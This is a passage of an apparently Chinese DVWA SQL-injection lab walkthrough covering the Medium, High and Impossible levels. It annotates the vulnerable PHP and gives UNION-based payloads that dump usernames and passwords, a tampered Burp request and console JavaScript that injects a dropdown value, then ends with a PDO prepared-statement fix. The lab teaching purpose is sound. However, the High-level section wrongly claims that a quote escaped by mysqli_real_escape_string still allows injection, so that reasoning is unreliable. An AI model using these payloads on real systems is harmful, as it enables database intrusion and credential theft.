&amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 仍然拼接SQL，虽然转义了 ★★★</span></span><br><span class="line">    <span class="comment">// 注意：查询语句结构和Low难度相同</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用mysqli_query执行查询</span></span><br><span class="line">    <span class="comment">// mysqli_query() - mysqli扩展的查询函数</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> )</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])</span><br><span class="line">        : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取结果</span></span><br><span class="line">    <span class="comment">// mysqli_fetch_assoc() - 将结果行作为关联数组返回</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$row</span> ) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br /&gt;First name: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ] . <span class="string">&#x27;&lt;br /&gt;Surname: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>POST请求</strong> - 不在URL中暴露参数</li>
<li><strong>mysqli_real_escape_string()</strong> - 转义特殊字符</li>
<li><strong>下拉菜单</strong> - 前端限制输入（可绕过）</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键漏洞：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意这里没有引号！</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT ... WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"><span class="comment">//                                    ^</span></span><br><span class="line"><span class="comment">//                                    没有单引号包裹</span></span><br></pre></td></tr></table></figure>

<p>虽然使用了<code>mysqli_real_escape_string()</code>，但SQL中<strong>没有用引号包裹</strong><code>$id</code>，所以：</p>
<ul>
<li>单引号转义无效（因为根本不需要闭合引号）</li>
<li>数字型注入仍然有效</li>
</ul>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：数字型注入（无需引号）"><a href="#方法1：数字型注入（无需引号）" class="headerlink" title="方法1：数字型注入（无需引号）"></a>方法1：数字型注入（无需引号）</h4><p>由于SQL中<code>user_id = $id</code>没有引号，可以直接注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1 OR 1=1</span></span><br><span class="line"><span class="comment">-- 完整SQL：SELECT ... WHERE user_id = 1 OR 1=1;</span></span><br><span class="line"><span class="comment">-- 结果：返回所有用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 输入：1 UNION SELECT user, password FROM users</span></span><br><span class="line"><span class="comment">-- 完整SQL：SELECT ... WHERE user_id = 1 UNION SELECT user, password FROM users;</span></span><br><span class="line"><span class="comment">-- 结果：显示用户名和密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 输入：1 AND 1=2 UNION SELECT database(), user()</span></span><br><span class="line"><span class="comment">-- 结果：显示数据库信息</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li>不需要单引号</li>
<li>不需要注释符</li>
<li>mysqli_real_escape_string()完全无效</li>
</ul>
<h4 id="方法2：使用Burp-Suite绕过前端限制"><a href="#方法2：使用Burp-Suite绕过前端限制" class="headerlink" title="方法2：使用Burp Suite绕过前端限制"></a>方法2：使用Burp Suite绕过前端限制</h4><p>Medium难度使用下拉菜单限制输入，但这只是前端限制：</p>
<p><strong>步骤：</strong></p>
<ol>
<li>打开Burp Suite，开启拦截</li>
<li>选择下拉菜单中的任意值，提交</li>
<li>在Burp中拦截请求</li>
<li>修改POST参数：</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dvwa/vulnerabilities/sqli/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">id=<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">user</span>, <span class="keyword">password</span> <span class="keyword">FROM</span> users&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>Forward请求</li>
<li>查看响应，获取数据</li>
</ol>
<h4 id="方法3：直接修改HTML"><a href="#方法3：直接修改HTML" class="headerlink" title="方法3：直接修改HTML"></a>方法3：直接修改HTML</h4><p><strong>浏览器控制台修改：</strong></p>
<ol>
<li>按F12打开开发者工具</li>
<li>在Console中执行：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加自定义选项</span></span><br><span class="line"><span class="keyword">var</span> select = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;id&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> option = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;option&#x27;</span>);</span><br><span class="line">option.<span class="property">value</span> = <span class="string">&#x27;1 UNION SELECT user, password FROM users&#x27;</span>;</span><br><span class="line">option.<span class="property">text</span> = <span class="string">&#x27;Inject&#x27;</span>;</span><br><span class="line">select.<span class="title function_">add</span>(option);</span><br><span class="line">select.<span class="property">value</span> = option.<span class="property">value</span>;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>提交表单</li>
</ol>
<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用了Session和页面跳转，增加了攻击复杂度。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：从SESSION获取ID ★★★</span></span><br><span class="line">    <span class="comment">// $_SESSION - 服务器端存储的会话变量</span></span><br><span class="line">    <span class="comment">// 数据存储在服务器，客户端只有session ID</span></span><br><span class="line">    <span class="comment">// 作用：避免直接从用户输入获取数据</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 仍然存在漏洞：直接拼接SQL ★★★</span></span><br><span class="line">    <span class="comment">// 虽然从SESSION获取，但SESSION的值来自另一个页面的用户输入！</span></span><br><span class="line">    <span class="comment">// 注意：这里有单引号包裹</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> )</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取结果</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$row</span> ) &#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br /&gt;First name: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ] . <span class="string">&#x27;&lt;br /&gt;Surname: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>关键点：</strong></p>
<p>High难度分为两个页面：</p>
<ol>
<li><strong>session-input.php</strong> - 接收用户输入，存入SESSION</li>
<li><strong>index.php</strong> - 从SESSION读取，执行查询</li>
</ol>
<p><strong>session-input.php代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 这里接收用户输入 ★★★</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入的ID</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 使用stripslashes()去除反斜杠 ★★★</span></span><br><span class="line">    <span class="comment">// stripslashes() - 删除反斜杠</span></span><br><span class="line">    <span class="comment">// 例如：\&#x27; 变成 &#x27;</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$id</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 使用mysqli_real_escape_string转义 ★★★</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 将处理后的ID存入SESSION ★★★</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重定向回主页面</span></span><br><span class="line">    <span class="comment">// header() - 发送原始HTTP头</span></span><br><span class="line">    <span class="comment">// Location - 重定向到指定URL</span></span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>使用SESSION</strong> - 数据存储在服务器端</li>
<li><strong>stripslashes()</strong> - 去除反斜杠</li>
<li><strong>mysqli_real_escape_string()</strong> - 转义特殊字符</li>
<li><strong>页面分离</strong> - 输入和查询在不同页面</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键问题：</strong></p>
<p>虽然使用了SESSION，但SESSION的值仍来自用户输入！</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → 转义 → 存入<span class="keyword">SESSION</span> → 从<span class="keyword">SESSION</span>读取 → 拼接<span class="keyword">SQL</span></span><br></pre></td></tr></table></figure>

<p>转义后的数据存入SESSION，但<strong>从SESSION读取后直接拼接</strong>，仍有注入风险。</p>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：直接在输入页面注入"><a href="#方法1：直接在输入页面注入" class="headerlink" title="方法1：直接在输入页面注入"></a>方法1：直接在输入页面注入</h4><p><strong>攻击流程：</strong></p>
<ol>
<li>访问 <code>session-input.php</code></li>
<li>在输入框中输入payload</li>
<li>虽然经过转义，但存入SESSION</li>
<li>返回主页面，从SESSION读取并执行</li>
</ol>
<p><strong>Payload：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT user, password FROM users --</span></span><br><span class="line"><span class="comment">-- 经过转义：1\&#x27; UNION SELECT user, password FROM users --</span></span><br><span class="line"><span class="comment">-- 存入SESSION：1\&#x27; UNION SELECT user, password FROM users --</span></span><br><span class="line"><span class="comment">-- 拼接到SQL：... WHERE user_id = &#x27;1\&#x27; UNION SELECT user, password FROM users -- &#x27; ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结果：转义的反斜杠会被MySQL处理，仍然可以注入</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：使用Burp-Suite"><a href="#方法2：使用Burp-Suite" class="headerlink" title="方法2：使用Burp Suite"></a>方法2：使用Burp Suite</h4><p><strong>步骤：</strong></p>
<ol>
<li>开启Burp代理</li>
<li>访问session-input.php</li>
<li>提交注入payload</li>
<li>在Burp中观察两次请求：<ul>
<li>POST到session-input.php（存入SESSION）</li>
<li>GET主页面（从SESSION读取执行）</li>
</ul>
</li>
<li>查看第二次请求的响应</li>
</ol>
<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用PDO预编译语句，真正安全的实现。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证输入是否为数字 ★★★</span></span><br><span class="line">    <span class="comment">// is_numeric() - 检查变量是否为数字或数字字符串</span></span><br><span class="line">    <span class="comment">// 作用：只接受数字，拒绝其他字符</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取ID</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护：PDO预编译语句 ★★★</span></span><br><span class="line">        <span class="comment">// $db - PDO数据库连接对象</span></span><br><span class="line">        <span class="comment">// prepare() - 准备SQL语句用于执行</span></span><br><span class="line">        <span class="comment">// :id - 命名参数占位符（参数化查询）</span></span><br><span class="line">        <span class="comment">// LIMIT 1 - 限制只返回一行</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 关键：SQL结构和数据完全分离！</span></span><br><span class="line">        <span class="comment">// 数据库先编译SQL结构，再绑定数据</span></span><br><span class="line">        <span class="comment">// 无论数据内容是什么，都只会被当作数据，不会被当作SQL代码执行</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 绑定参数 ★★★</span></span><br><span class="line">        <span class="comment">// bindParam() - 将参数绑定到预编译语句</span></span><br><span class="line">        <span class="comment">// 参数1：占位符名称</span></span><br><span class="line">        <span class="comment">// 参数2：要绑定的变量</span></span><br><span class="line">        <span class="comment">// 参数3：数据类型（PDO::PARAM_INT表示整数）</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 作用：将$id的值绑定到:id占位符</span></span><br><span class="line">        <span class="comment">// 数据类型明确指定为整数，进一步增强安全性</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 执行预编译语句 ★★★</span></span><br><span class="line">        <span class="comment">// execute() - 执行准备好的语句</span></span><br><span class="line">        <span class="comment">// 此时才真正执行查询，但数据已经被安全处理</span></span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 获取结果 ★★★</span></span><br><span class="line">        <span class="comment">// fetch() - 获取结果集的下一行</span></span><br><span class="line">        <span class="comment">// 返回关联数组</span></span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否有结果</span></span><br><span class="line">        <span class="comment">// rowCount() - 返回受影响的行数</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// 获取值</span></span><br><span class="line">            <span class="comment">// &#123;$row[ &#x27;first_name&#x27; ]&#125; - 输出first_name字段的值</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出结果</span></span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 未找到用户</span></span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 输入不是数字，拒绝 ★★★</span></span><br><span class="line">        <span class="comment">// 明确的错误信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID must be numeric&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><ol>
<li><strong>输入验证</strong> - <code>is_numeric()</code>只接受数字</li>
<li><strong>PDO预编译</strong> - SQL结构和数据完全分离</li>
<li><strong>参数绑定</strong> - 数据类型明确指定</li>
<li><strong>限制结果</strong> - <code>LIMIT 1</code>限制返回行数</li>
</ol>
<h3 id="PDO预编译原理"><a href="#PDO预编译原理" class="headerlink" title="PDO预编译原理"></a>PDO预编译原理</h3><p><strong>传统拼接（不安全）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险方式</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// 如果$id = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">// 结果：SELECT * FROM users WHERE id = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;</span></span><br><span class="line"><span class="comment">// 注入成功！</span></span><br></pre></td></tr></table></figure>

<p><strong>PDO预编译（安全）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安全方式</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行过程：</span></span><br><span class="line"><span class="comment">// 1. 数据库先编译SQL结构：&quot;SELECT * FROM users WHERE id = ?&quot;</span></span><br><span class="line"><span class="comment">// 2. 然后绑定数据：id = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">// 3. 数据被当作字符串整体，不会被解析为SQL代码</span></span><br><span class="line"><span class="comment">// 4. 实际执行：SELECT * FROM users WHERE id = &#x27;1\&#x27; OR \&#x27;1\&#x27;=\&#x27;1\&#x27;&#x27;</span></span><br><span class="line"><span class="comment">// 5. 查找id为整个字符串的记录（不存在），注入失败！</span></span><br></pre></td></tr></table></figure>

<p><strong>为什么预编译安全？</strong></p>
